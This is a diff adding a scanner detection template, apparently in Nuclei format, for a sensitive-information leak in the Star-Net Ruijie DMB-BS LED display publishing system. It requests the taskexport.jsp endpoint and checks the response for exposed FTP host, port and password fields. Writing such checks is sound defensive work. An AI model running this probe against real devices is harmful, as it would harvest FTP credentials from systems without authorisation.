@@ -1,0 +1,29 @@
+id: poc-yaml-star-net-taskexport-info-leak
+info:
+  name: 星网锐捷 DMB-BS LED屏信息发布系统taskexport接口处存在敏感信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 信息泄露
+  description: |
+    检测星网锐捷 DMB-BS LED屏信息发布系统的 taskexport 接口是否存在敏感信息泄露。
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dmb/out/taskexport.jsp?taskcode"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<ftp host"
+        part: body
+      - type: word
+        words:
+          - "port="
+        part: body
+      - type: word
+        words:
+          - "pwd="
+        part: body
